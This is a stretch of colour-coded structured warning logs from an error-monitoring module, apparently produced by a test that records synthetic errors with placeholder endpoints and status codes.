WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704111Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 378'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704160Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 379'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704207Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 380'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704256Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 381'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704347Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 382'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704422Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 383'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704478Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 384'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704530Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 385'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704581Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 386'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704630Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 387'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704679Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 388'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704728Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 389'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704777Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 390'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704826Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 391'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704875Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 392'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704923Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 393'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704971Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 394'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705019Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 395'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705068Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 396'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705143Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 397'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705227Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 398'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705285Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 399'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705336Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 400'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705387Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 401'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705436Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 402'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705485Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 403'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705610Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 404'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705679Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 405'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705733Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 406'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705783Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 407'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705832Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 408'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705885Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 409'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705933Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 410'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.705982Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 411'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706030Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 412'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706077Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 413'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706125Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 414'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706173Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 415'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706272Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 416'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706353Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 417'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
